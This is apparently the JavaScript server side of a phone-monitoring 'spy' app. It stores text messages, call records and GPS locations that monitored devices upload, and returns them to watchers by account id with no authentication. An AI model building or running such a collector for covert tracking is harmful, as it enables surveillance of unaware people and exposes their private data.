var http = require('http');
var mongo = require( './utils/mongoUtils' );
var url = require('url');
var assert = require('assert');

const LISTEN_PORT=9900;

var server = http.createServer(handleRequest).listen(
    LISTEN_PORT,
    function(){
        console.log("Server listening on: http://localhost:%s", LISTEN_PORT);
    }
);

function handleRequest(request, response){
    console.log("Request to " + url.parse(request.url).pathname);
    switch (url.parse(request.url).pathname) {
        case '/' :
            console.log('Spy backend welcomes you');
            response.end('Spy backend welcomes you');
            break;
        case '/accounts' :
            if (isPost(request)) {
                processPostRequest(request, response, 'accounts');
            } else if (isGet(request)) {
                getAccountInfo(url.parse(request.url, true), response);
            }
            break;
        case '/devices' :
            if (isPost(request)) {
                processAddWriterDevice(request, response, 'devices');
            } else {
                processGetDevicesByAccount(url.parse(request.url, true), response);
            }
            break;
        case '/messages' :
            if (isPost(request)) {
                processPostRequest(request, response, 'messages');
            } else if (isGet(request)) {
                processGetDataRequest(url.parse(request.url, true), 'messages', response);
            }
            break;
        case '/calls' :
            if (isPost(request)) {
                processPostRequest(request, response, 'calls');
            } else if (isGet(request)) {
                processGetDataRequest(url.parse(request.url, true), 'calls', response);
            }
            break;
        case '/gps' :
            if (isPost(request)) {
                processPostRequest(request, response, 'gps');
            } else if (isGet(request)) {
                processGetDataRequest(url.parse(request.url, true), 'gps', response);
            }
            break;
        default :

    }
}

function isPost(request) {
    return request.method == 'POST';
}

function isGet(request) {
    return request.method == 'GET';
}

function getAccountInfo(params, response) {
    console.log(params.query);
    mongo.getAccountInfo(params.query.account, function(data){
        response.writeHead(200, "OK", {'Content-Type': 'application/json; charset=UTF-8'});
        console.log("Requested data: ");
        console.log(data);
        response.end(JSON.stringify(data));
    });
}

function processAddWriterDevice(request, response) {
    console.log(request.method + " to " + request.url);
    var collection = 'devices';
    var data = '';
    request.on('data', function (chunk) {
        console.log(chunk.toString());
        data += chunk;
    });
    request.on('end', function () {
        mongo.storeData(JSON.parse(data), collection,
            function (result) {
                var responseBody = [];
                console.log("Inserts result: ");
                console.log(result);
                for (var i = 0; i < result.ops.length; i++) {
                    responseBody.push(result.ops[i]._id);
                }
                response.writeHead(200, "OK", {'Content-Type': 'text/html'});
                response.end(JSON.stringify(responseBody));
            },
            function(error) {
                console.log("Error while adding to " + collection + ": " + error);
                response.writeHead(500, "Error", {'Content-Type': 'text/html'});
                response.end();
            });
    });
}

function processGetDevicesByAccount(params, response) {
    console.log(params.query);
    mongo.getDevicesByAccount(params.query.account, function(data){
        response.writeHead(200, "OK", {'Content-Type': 'application/json; charset=UTF-8'});
        console.log("Requested data: ");
        console.log(data);
        var responseBody = [];
        for (var i=0; i<data.length; i++) {
            responseBody.push(data[i]._id);
        }
        response.end(JSON.stringify(responseBody));
    });
}

function processGetDataRequest(params, collection, response) {
    console.log(params.query);
    mongo.getWatcherData(params.query, collection,
        function(data) {
            response.writeHead(200, "OK", {'Content-Type': 'application/json; charset=UTF-8'});
            console.log("Requested data: ");
            console.log(data);
            response.end(JSON.stringify(data));
        });
}

function processPostRequest(request, response, collection) {
    console.log(request.method + " to " + request.url);
    var data = '';
    request.on('data', function (chunk) {
        console.log(chunk.toString());
        data += chunk;
    });
    request.on('end', function () {
        mongo.storeData(JSON.parse(data), collection,
            function () {
                response.writeHead(200, "OK", {'Content-Type': 'text/html'});
                response.end();
            },
            function(error) {
                console.log("Error while adding to " + collection + ": " + error);
                response.writeHead(500, "Error", {'Content-Type': 'text/html'});
                response.end();
            });
    });
}

function methodNotSupported(request, response) {
    console.log("[405] " + request.method + " to " + request.url);
    response.writeHead(405, "Method not supported", {'Content-Type': 'text/html'});
    response.end('<html><head><title>405 - Method not supported</title></head><body><h1>Method not supported.</h1></body></html>');
}

function operationNotSupported(request, response) {
    console.log("[400] " + request.url);
    response.writeHead(400, "Operation not supported", {'Content-Type': 'text/html'});
    response.end('<html><head><title>400 - Operation not supported</title></head><body><h1>Operation not supported.</h1></body></html>');
}